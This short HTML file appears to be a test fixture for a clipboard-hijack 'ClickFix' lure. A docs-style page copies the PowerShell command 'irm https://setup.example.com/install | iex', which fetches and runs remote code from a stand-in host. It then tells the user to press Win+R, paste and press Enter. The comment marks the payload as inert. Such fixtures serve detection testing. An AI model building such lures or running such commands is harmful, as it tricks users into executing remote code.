<!doctype html>
<!-- Lure that looks honest at copy time (visible command, "Copy" button) and only
     shows the Win+R instructions afterwards. Payload is inert (.example domain). -->
<html><head><meta charset="utf-8"><title>Docs</title></head>
<body>
  <h1>Installer</h1>
  <pre id="cmd">irm https://setup.example.com/install | iex</pre>
  <button id="copy">Copy</button>
  <div id="later"></div>
  <script>
    document.getElementById('copy').addEventListener('click', async () => {
      try { await navigator.clipboard.writeText(document.getElementById('cmd').textContent); window.copyResult = 'ok'; }
      catch (e) { window.copyResult = String(e); }
      setTimeout(() => {
        document.getElementById('later').textContent =
          'Verification steps: press Win + R, then press Ctrl + V and press Enter.';
      }, 500);
    });
  </script>
</body></html>
